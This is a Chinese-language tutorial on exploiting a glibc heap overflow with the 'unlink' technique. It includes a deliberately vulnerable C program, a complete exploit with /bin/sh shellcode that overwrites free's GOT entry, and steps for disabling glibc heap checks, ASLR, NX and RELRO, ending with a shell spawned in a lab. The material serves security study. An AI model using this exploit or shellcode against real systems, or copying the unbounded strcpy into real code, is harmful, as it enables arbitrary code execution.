## Heap overflow using unlink

​		这篇文章学习如何使用 unlink 技术成功地利用堆溢出。在查看 unlink 之前，首先查看一个易受攻击的程序：

```c
/* 
 Heap overflow vulnerable program. 
 */
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

int main( int argc, char * argv[] )
{
        char * first, * second;
/*[1]*/ first = malloc( 666 );
/*[2]*/ second = malloc( 12 );
        printf("argc=%i\n",argc);
        printf("first is at %p\n",first);
        printf("second is at %p\n",second);
        if(argc!=1)
/*[3]*/         strcpy( first, argv[1] );
/*[4]*/ free( first );
/*[5]*/ free( second );
/*[6]*/ return( 0 );
}

```

​		上述程序的第 [3] 行导致堆溢出。用户输入 "argv[1]" 被复制到堆缓冲区 "first"，没有任何大小限制。因此，当用户输入大于 666 字节时，它必然会覆盖下一个块的块头。此溢出导致任意代码执行。

<u>堆内存示意图：</u>

```
				...		0x806b000
			Top Chunk
				...
			size=0x20d51
			prev_size		<----------- top
			Allocated Chunk	 	 <----------- second
			size=0x11
			prev_size		<------------ Second chunk pointer
			Allocated Chunk	 	 <------------ first
			size=0x2a1
			prev_size		<------------ First chunk poiniter
						0x804a000	
```

**Unlink:** 该技术的主要思想是欺骗 "glibc malloc" 以取消链接第二个块。Unlink 空闲的GOT条目将被shellcode地址覆盖。覆盖后，当程序在第[5]行执行调用free函数时，shellcode将会被执行。

​		在没有攻击者影响的情况下，第[4]行的free执行以下操作：

* 对于非映射块，向后或向前合并块。

* 向后合并：
  * 查找前一个块是否空闲：如果当前释放块的`PREV_INUSE(P)位`未设置，则前一个块是空闲的。在这个例子中，前一个块已经被分配，因为 "first" 的 `PREV_INUSE`位已设置。
  * 如果空闲，则合并：从其`binlist`中取消链接（删除）前一个块，将前一个块大小添加到当前块大小，并将指针更改为指向前一个块。在这个例子中，前一个块已分配，因此未调用unlink，不能向后合并。
* 向前合并：
  * 查找next chunk是否空闲：如果next-to-next chunk的`PREV_INUSE (P) 位`未设置，则next chunk是空闲的。在这个例子中，当前释放的 "first"块的 next-to-next 块是top块，并且它的`PREV_INUSE 位`被设置。因此 next chunk 不是空闲的。
  * 如果空闲，则合并：从 binlist 中 unlink next chunk 并且在当前块中添加next chunk的大小。但是在这个例子中，next chunk已经被分配，因此不会调用unlink，不能向前合并。
* 将合并的块添加到 unsorted bin。在这个例子中，由于没有发生合并，只需将 "first" 块添加到 unsorted bin。

​		现在假设第[3]行执行后，攻击者构造特定数据覆盖 "second" 块的块头，如下所示：

```
* prev_size = 偶数，因此 PREV_INUSE 位未设置。
* size = -4
* fd = free_address – 12
* bk = shellcode address
```

​		在这种情况下，第[4]行的free函数执行以下操作：

1. 对于非映射块，向后或向前合并块。

2. 向后合并：由于"first" 块的 PREV_INUSE 位被设置，即前一个块被分配（默认情况下，堆内存的第一个块之前的块被分配，即使它不存在），因此当前释放的 "first" 块不能向后合并。

3. 向前合并：

   (1)  当前释放的 "first“ 块的下一个块不是top块。由于攻击者使用 **"-4"** 覆盖了 "second"块的大小，因此 next-to-next 块位于 "second"块的 "-4"偏移量的位置。因此，现在 "glibc malloc" 将 "second"块的 `prev_inuse`视为下一个块的size字段。由于攻击者覆盖了一个偶数（即 PREV_INUSE (P) 位未设置）代替prev_size，glibc malloc 认为"second"块是空的。

   (2)  如果空闲，则合并：由于第二个块是空的，因此第二个块的 unlink 如下：

   ​	1）将第二个块的 fd 和 bk 值分别复制到变量 FD 和 BK 。在我们的例子中，`FD = free_address – 12 , BK = 	shellcode address`（攻击者将shellcode放在第一个堆的缓冲区中）。

   ​	2）BK 的值被复制到与 FD 偏移 **"12"** 的位置。在我们的例子中，向 FD 添加 12字节，指向 free的 GOT条目，因此free函数的GOT条目被shellcode地址覆盖。

<u>攻击者输入后的堆内存布局：</u>

```
					Top Chunk
					size=0x20d51
					prev_size		<-----top chunk
					bk=0x804a018
					fd=0x8049780		<-----second
					size=-4
					prev_size=0x0defacec	<-----second chunk pointer
					shellcode+Padding	<-----first chunk
					size=0x2a1				
					prev_size		<-----first chunk pointer
```

​		了解了unlink技术后，编写漏洞利用程序：

```c
/* Program to exploit 'vuln' using unlink technique.
 */
#include <string.h>
#include <unistd.h>

#define FUNCTION_POINTER ( 0x0804981c )         //Address of GOT entry for free function obtained using "objdump -R vuln".
#define CODE_ADDRESS ( 0x0804a008 + 0x10 )      //Address of variable 'first' in vuln executable. 

#define VULNERABLE "./vuln"
#define DUMMY 0xdefaced
#define PREV_INUSE 0x1

char shellcode[] =
        /* Jump instruction to jump past 10 bytes. ppssssffff - Of which ffff would be overwritten by unlink function
        (by statement BK->fd = FD). Hence if no jump exists shell code would get corrupted by unlink function. 
        Therefore store the actual shellcode 12 bytes past the beginning of buffer 'first'*/
        "\xeb\x0assppppffff"
        "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

int main( void )
{
        char * p;
        char argv1[ 680 + 1 ];
        char * argv[] = { VULNERABLE, argv1, NULL };

        p = argv1;
        /* the fd field of the first chunk */
        *( (void **)p ) = (void *)( DUMMY );
        p += 4;
        /* the bk field of the first chunk */
        *( (void **)p ) = (void *)( DUMMY );
        p += 4;
        /* the fd_nextsize field of the first chunk */
        *( (void **)p ) = (void *)( DUMMY );
        p += 4;
        /* the bk_nextsize field of the first chunk */
        *( (void **)p ) = (void *)( DUMMY );
        p += 4;
        /* Copy the shellcode */
        memcpy( p, shellcode, strlen(shellcode) );
        p += strlen( shellcode );
        /* Padding- 16 bytes for prev_size,size,fd and bk of second chunk. 16 bytes for fd,bk,fd_nextsize,bk_nextsize 
        of first chunk */
        memset( p, 'B', (680 - 4*4) - (4*4 + strlen(shellcode)) );
        p += ( 680 - 4*4 ) - ( 4*4 + strlen(shellcode) );
        /* the prev_size field of the second chunk. Just make sure its an even number ie) its prev_inuse bit is unset */
        *( (size_t *)p ) = (size_t)( DUMMY & ~PREV_INUSE );
        p += 4;
        /* the size field of the second chunk. By setting size to -4, we trick glibc malloc to unlink second chunk.*/
        *( (size_t *)p ) = (size_t)( -4 );
        p += 4;
        /* the fd field of the second chunk. It should point to free - 12. -12 is required since unlink function
        would do + 12 (FD->bk). This helps to overwrite the GOT entry of free with the address we have overwritten in 
        second chunk's bk field (see below) */
        *( (void **)p ) = (void *)( FUNCTION_POINTER - 12 );
        p += 4;
        /* the bk field of the second chunk. It should point to shell code address.*/
        *( (void **)p ) = (void *)( CODE_ADDRESS );
        p += 4;
        /* the terminating NUL character */
        *p = '\0';

        /* the execution of the vulnerable program */
        execve( argv[0], argv, NULL );
        return( -1 );
}

```

​		在执行exploit之前，由于目前对 unlink 技术已有一定的保护，需要取消 "glibc malloc"中的堆检查（修改并重新编译libc中的malloc.c，glibc-2.20源码：https://sourceware.org/legacy-ml/libc-alpha/2014-09/msg00088.html）：

* Double free：释放处于空闲的块。当攻击者用 -4 覆盖"second"块的大小时，其 PREV_INUSE 位未设置，这意味着 "first" 块已经处于空闲状态。因此 'glibc malloc' 抛出双重释放错误。

```c
    if (__glibc_unlikely (!prev_inuse(nextchunk)))
      {
        errstr = "double free or corruption (!prev)";
        goto errout;
      }
```

* Invalid next size：下一个块的大小应该在arena总系统内存的8个字节之间。当攻击者用 -4 覆盖“第二个”块的大小时，“glibc malloc”会抛出无效的下一个大小错误。

```
 if (__builtin_expect (nextchunk->size <= 2 * SIZE_SZ, 0)
        || __builtin_expect (nextsize >= av->system_mem, 0))
      {
        errstr = "free(): invalid next size (normal)";
        goto errout;
      }
```

* Courrupted Double Linked List：前一个块的 fd 和下一个块的 bk 应该指向当前未链接的块。 当攻击者分别用 free -12 和 shellcode 地址覆盖 fd 和 bk 时，free 和 shellcode 地址 8 并不指向当前未链接的块（“second”块）。 因此“glibc malloc”会抛出损坏的双链表错误。

```
gcc -g -z norelro -z execstack -o vuln vuln.c -Wl,--rpath=/home/user/glibc-inst2.20/lib -Wl,--dynamic-linker=/home/user/glibc-inst2.20/lib/ld-linux.so.2
```

* 关闭 ASLR，NX，RELRO 保护机制。

​		在上述条件下，编译glibc 和 vuln.c，执行漏洞利用程序：

```bash
user@ubuntu:~/project$ ../glibc-2.20/configure -prefix=/home/user/glibc-inst2.20/
...
user@ubuntu:~/project$ make
...
user@ubuntu:~/project$ make install
...

user@ubuntu:~/project$ gcc -g -z norelro -z execstack -o vuln vuln.c -Wl,--rpath=/home/user/glibc-inst2.20/lib -Wl,--dynamic-linker=/home/user/glibc-inst2.20/lib/ld-linux.so.2
user@ubuntu:~/project$ gcc -o exp exp.c 
user@ubuntu:~/project$ ./exp
argc=2
first is at 0x804a008
second is at 0x804a2a8
$ ls
exp  exp.c  vuln  vuln.c
```

​		执行exp，生成了新的shell，实现了使用unlink技术进行堆利用。
